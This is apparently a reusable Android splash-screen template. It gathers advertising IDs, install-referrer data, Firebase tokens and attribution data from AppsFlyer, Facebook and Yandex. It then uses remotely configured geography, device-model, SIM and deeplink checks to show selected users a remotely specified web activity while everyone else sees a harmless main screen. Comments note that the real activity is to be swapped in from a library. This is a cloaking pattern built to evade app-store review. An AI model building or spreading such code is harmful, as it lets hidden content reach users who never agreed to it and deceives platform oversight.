package com.dghigh.liva;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.RemoteException;
import android.text.TextUtils;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;
import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;

import com.dghigh.liva.utils.AdvertisingIdCollector;
import com.dghigh.liva.utils.AppLogsRest;
import com.dghigh.liva.utils.DataGenerator;
import com.dghigh.liva.utils.Params;
import com.dghigh.liva.utils.PreferencesOutsiderMan;
import com.dghigh.liva.utils.RemoteParamsChecker;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.instantapps.InstantApps;
import com.google.firebase.FirebaseApp;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.yandex.metrica.DeferredDeeplinkParametersListener;
import com.yandex.metrica.YandexMetrica;

import org.json.JSONObject;
import java.util.Map;
import java.util.Objects;

public class SplashAct extends AppCompatActivity {
    public Context mContext;
    SharedPreferences pref;
    RemoteParamsChecker remoteParamsChecker;
    private static boolean appsflyerInitiated = false;
    private static boolean referrerInitiated = false;
    InstallReferrerClient referrerClient;

    private String[] parts = null;
    private String TAG = "SplashActivity";
    boolean isHashReady;

    boolean allowedGeo;
    boolean allowedGeoInstant;
    boolean modelCheck;
    boolean simCheck;
    boolean dpCheck;
    boolean dpCheckInstant;

    private String appType = "installed app";
    String path;
    String webIdArray;

    FirebaseRemoteConfig mFirebaseRemoteConfig;

    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.fragment_splash);

        if (!isTaskRoot()) {
            final Intent intent = getIntent();
            final String intentAction = intent.getAction();
            if (intent.hasCategory(Intent.CATEGORY_LAUNCHER) && intentAction != null && intentAction.equals(Intent.ACTION_MAIN)) {
                finish();
                return;
            }
        }

        collectAdvertisingId();
        initAppsFlyer();
    }

    private void initInstallReferrer() {
        referrerClient = InstallReferrerClient.newBuilder(this).build();
        referrerClient.startConnection(new InstallReferrerStateListener() {
            @Override
            public void onInstallReferrerSetupFinished(int responseCode) {
                switch (responseCode) {
                    case InstallReferrerClient.InstallReferrerResponse.OK:
                        ReferrerDetails response;

                        if (!referrerInitiated) {
                            try {
                                response = referrerClient.getInstallReferrer();
                                PreferencesOutsiderMan.setParam(Params.INSTALL_REFERRER, response.getInstallReferrer());
                                Log.e("MyApp", PreferencesOutsiderMan.getParam(Params.INSTALL_REFERRER));
                                referrerClient.endConnection();
                                referrerInitiated = true;
                                initRemoteConfig();

                            } catch (RemoteException e) {
                                e.printStackTrace();
                            }
                        }

                        break;

                    case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                        Log.e("MyApp", "FEATURE_NOT_SUPPORTED");
                        PreferencesOutsiderMan.setParam(Params.INSTALL_REFERRER, "referrer not supported");
                        if (!referrerInitiated) {
                            referrerInitiated = true;
                            initRemoteConfig();
                        }
                        break;
                }
            }

            @Override
            public void onInstallReferrerServiceDisconnected() {
            }
        });
    }

    private void initAppsFlyer() {

        AppsFlyerConversionListener conversionDataListener =
                new AppsFlyerConversionListener() {

                    @Override
                    public void onConversionDataSuccess(Map<String, Object> conversionData) {

                        Log.e(TAG, "onConversionDataSuccess: " + conversionData);

                        PreferencesOutsiderMan.setParam(Params.DEEPLINKS, new JSONObject(conversionData).toString());

                        if (conversionData.get("campaign") != null && String.valueOf(conversionData.get("campaign")).contains("dgb")) {

                            PreferencesOutsiderMan.setParam(Params.WEB_ID, String.valueOf(conversionData.get("campaign")).split("_")[1]);
                            PreferencesOutsiderMan.setParam(Params.WEB_SUB, String.valueOf(conversionData.get("campaign")).split("_")[3]);
                            PreferencesOutsiderMan.setParam(Params.CAMPAIGN, String.valueOf(conversionData.get("campaign")));

                            if (conversionData.get(Params.MEDIA_SOURCE) != null) PreferencesOutsiderMan.setParam(Params.MEDIA_SOURCE, String.valueOf(conversionData.get(Params.MEDIA_SOURCE)));
                            if (conversionData.get(Params.AGENCY) != null) PreferencesOutsiderMan.setParam(Params.MEDIA_SOURCE, String.valueOf(conversionData.get(Params.AGENCY)));
                            if (conversionData.get(Params.AD_ID) != null) PreferencesOutsiderMan.setParam(Params.AD_ID, String.valueOf(conversionData.get(Params.AD_ID)));
                            if (conversionData.get(Params.ADSET_ID) != null) PreferencesOutsiderMan.setParam(Params.ADSET_ID, String.valueOf(conversionData.get(Params.ADSET_ID)));
                            if (conversionData.get(Params.CAMPAIGN_ID) != null) PreferencesOutsiderMan.setParam(Params.CAMPAIGN_ID, String.valueOf(conversionData.get(Params.CAMPAIGN_ID)));
                        }

                        isHashReady = PreferencesOutsiderMan.getisHashReady();
                        if (!isHashReady) {
                            PreferencesOutsiderMan.setParam(Params.APPSFLYER_ID, AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()));
                            PreferencesOutsiderMan.setisHashReady(true);
                        }

                        if (!appsflyerInitiated) {
                            appsflyerInitiated = true;
                            requestAppmetricaDeeplink();
                        }
                    }

                    @Override
                    public void onConversionDataFail(String errorMessage) {
                        Log.d("LOG_TAG", "error getting conversion data: " + errorMessage);

                        PreferencesOutsiderMan.setParam(Params.DEEPLINKS, new JSONObject().toString());

                        if (!appsflyerInitiated) {
                            appsflyerInitiated = true;
                            requestAppmetricaDeeplink();
                            AppLogsRest appLogsRest = new AppLogsRest();
                            appLogsRest.sendLogs(getApplicationContext(),true, "error getting conversion data: " + errorMessage);
                        }
                    }

                    @Override
                    public void onAppOpenAttribution(Map<String, String> conversionData) {

                        for (String attrName : conversionData.keySet()) {
                            Log.d("LOG_TAG", "attribute: " + attrName + " = " + conversionData.get(attrName));
                        }

                    }

                    @Override
                    public void onAttributionFailure(String errorMessage) {
                        Log.d("LOG_TAG", "error onAttributionFailure : " + errorMessage);
                    }
                };

        AppsFlyerLib.getInstance().init(Params.APPSFLYER_DEV_KEY, conversionDataListener , this);
        AppsFlyerLib.getInstance().startTracking(getApplicationContext(), Params.APPSFLYER_DEV_KEY);
    }

    private boolean isGooglePlayStoreAvailable(Context context) {

        PackageManager pm = context.getPackageManager();

        boolean app_installed;

        try {
            PackageInfo info = pm.getPackageInfo("com.android.vending", PackageManager.GET_ACTIVITIES);
            String label = (String) info.applicationInfo.loadLabel(pm);
            app_installed = (!TextUtils.isEmpty(label) && label.startsWith("Google Play"));
        } catch(PackageManager.NameNotFoundException e) {
            app_installed = false;
        }

        return app_installed;
    }

    private void fetchFacebookDeepLink() {

        AppLinkData.fetchDeferredAppLinkData(this,
                appLinkData -> {

                    try {

                        Uri uri = appLinkData.getTargetUri();
                        Log.d("FacebookData","fetchDeferredAppLinkData URi :" + uri);

                        if (uri != null)
                            processFacebookDeepLink(uri);
                        return;

                    } catch (Throwable throwable){
                        Log.e("FacebookData","failed to parse",throwable);
                    }

                    initFirebase();
                }
        );
    }

    @SuppressWarnings("ConstantConditions")
    private void processFacebookDeepLink(Uri uri) {

        if (uri.getQueryParameter(Params.MEDIA_SOURCE) != null) PreferencesOutsiderMan.setParam(Params.MEDIA_SOURCE, uri.getQueryParameter(Params.MEDIA_SOURCE));
        if (uri.getQueryParameter(Params.AGENCY) != null) PreferencesOutsiderMan.setParam(Params.AGENCY, uri.getQueryParameter(Params.AGENCY));
        if (uri.getQueryParameter(Params.AD_ID) != null) PreferencesOutsiderMan.setParam(Params.AD_ID, uri.getQueryParameter(Params.AD_ID));
        if (uri.getQueryParameter(Params.ADSET_ID) != null) PreferencesOutsiderMan.setParam(Params.ADSET_ID, uri.getQueryParameter(Params.ADSET_ID));
        if (uri.getQueryParameter(Params.CAMPAIGN_ID) != null) PreferencesOutsiderMan.setParam(Params.CAMPAIGN_ID, uri.getQueryParameter(Params.CAMPAIGN_ID));

        if (uri.getQueryParameter(Params.CAMPAIGN) != null && uri.getQueryParameter(Params.CAMPAIGN).contains("dgb")) {

            parts = uri.getQueryParameter(Params.CAMPAIGN).split("_");

            if (parts.length > 1) {
                PreferencesOutsiderMan.setParam(Params.WEB_ID, parts[1]);
                PreferencesOutsiderMan.setParam(Params.WEB_SUB, parts[3]);
            }

            PreferencesOutsiderMan.setParam(Params.CAMPAIGN, uri.getQueryParameter(Params.CAMPAIGN));

        }

        initFirebase();
    }

    private void requestAppmetricaDeeplink() {

        if (isGooglePlayStoreAvailable(getApplicationContext())) {
            YandexMetrica.requestDeferredDeeplinkParameters(new DeferredDeeplinkParametersListener() {
                @Override
                public void onParametersLoaded(Map<String, String> parameters) {

                    if (parameters.get(Params.CAMPAIGN) != null && String.valueOf(parameters.get(Params.CAMPAIGN)).contains("dgb")) {

                        parts = Objects.requireNonNull(parameters.get(Params.CAMPAIGN)).split("_");

                        if (parts.length > 1) {
                            PreferencesOutsiderMan.setParam(Params.WEB_ID, parts[1]);
                            PreferencesOutsiderMan.setParam(Params.WEB_SUB, parts[3]);
                        }

                        PreferencesOutsiderMan.setParam(Params.CAMPAIGN, String.valueOf(parameters.get(Params.CAMPAIGN)));
                    }

                    fetchFacebookDeepLink();

                }

                @Override
                public void onError(Error error, String referrer) {
                    // Handling the error.
                    Log.e("Error!", error.getDescription());
                    fetchFacebookDeepLink();
                }
            });
        } else {
            fetchFacebookDeepLink();
        }
    }

    private void initFirebase() {
        FirebaseApp.initializeApp(getApplicationContext());
        FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w("MyApp", "getInstanceId failed", task.getException());
                return;
            }
            // Get new Instance ID token
            String token = task.getResult().getToken();
            PreferencesOutsiderMan.setParam(Params.FIREBASE_TOKEN, token);
            initInstallReferrer();
        });
    }

    private void initRemoteConfig() {

        runOnUiThread(() -> {

            mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                    .setMinimumFetchIntervalInSeconds(3600)
                    .build();
            mFirebaseRemoteConfig.setConfigSettingsAsync(configSettings);
            mFirebaseRemoteConfig.fetchAndActivate()
                    .addOnCompleteListener(SplashAct.this, task -> {
                        if (task.isSuccessful()) {
                            boolean updated = task.getResult();
                            Log.e("Config params updated ", String.valueOf(updated));
                        }

                        allowedGeo = mFirebaseRemoteConfig.getBoolean("allowed_geo");
                        allowedGeoInstant = mFirebaseRemoteConfig.getBoolean("allowed_geo_instant");
                        modelCheck = mFirebaseRemoteConfig.getBoolean("model_check");
                        simCheck = mFirebaseRemoteConfig.getBoolean("sim_check");
                        dpCheck = mFirebaseRemoteConfig.getBoolean("dp_check");
                        dpCheckInstant = mFirebaseRemoteConfig.getBoolean("dp_check_instant");
                        path = mFirebaseRemoteConfig.getString("path");
                        webIdArray = mFirebaseRemoteConfig.getString("web_id_array");

                        // Log.e("allowed_geo ", String.valueOf(allowedGeo));
                        // Log.e("allowed_geo_instant ", String.valueOf(allowedGeoInstant));
                        // Log.e("model_check ", String.valueOf(modelCheck));
                        // Log.e("sim_check ", String.valueOf(simCheck));
                        // Log.e("dp_check ", String.valueOf(dpCheck));
                        // Log.e("dp_check_instant ", String.valueOf(dpCheckInstant));
                        // Log.e("path ", path);
                        // Log.e("web_id_array ", webIdArray);

                        if (isInstantApp())
                            appType = "instant app";


                        splitUsers();
                    });
        });

    }

    private void collectAdvertisingId() {
        Thread thread = new Thread() {
            @Override
            public void run() {
                PreferencesOutsiderMan.setParam(Params.ADVERTISING_DEVICE_ID,
                        new AdvertisingIdCollector()
                        .collect(getApplicationContext()));
            }
        };
        thread.start();
    }

    private void splitUsers() {

        DataGenerator dataGenerator = new DataGenerator();
        Log.e(TAG, dataGenerator.generate(getApplicationContext()));

        remoteParamsChecker = new RemoteParamsChecker();

        if (remoteParamsChecker.isAllowed(
                allowedGeo,
                allowedGeoInstant,
                modelCheck,
                simCheck,
                dpCheck,
                dpCheckInstant,
                this)) {

            initWb();
            return;
        }

        initUI();
    }

    private boolean isInstantApp() {
        return InstantApps.getPackageManagerCompat(this).isInstantApp();
    }

    private void initUI() {

        runOnUiThread(() -> {

            // поменять на актуальный activity
            SplashAct.this.startActivity(new Intent(SplashAct.this,
                    MainActivity.class));
            SplashAct.this.finish();
        });
    }

    private void initWb() {

        // поменять на актуальный activity из aar-библиотеки
        Intent i = new Intent(SplashAct.this, (Class<?>)Params.LIBRARY_ACTIVITY);
        i.putExtra(Params.END, path);
        i.putExtra(Params.Q, new DataGenerator().generate(getApplicationContext()));
        i.putExtra(Params.YANDEX, Params.YANDEX_METRICA_ID);

        startActivity(i);
        finish();
    }
}
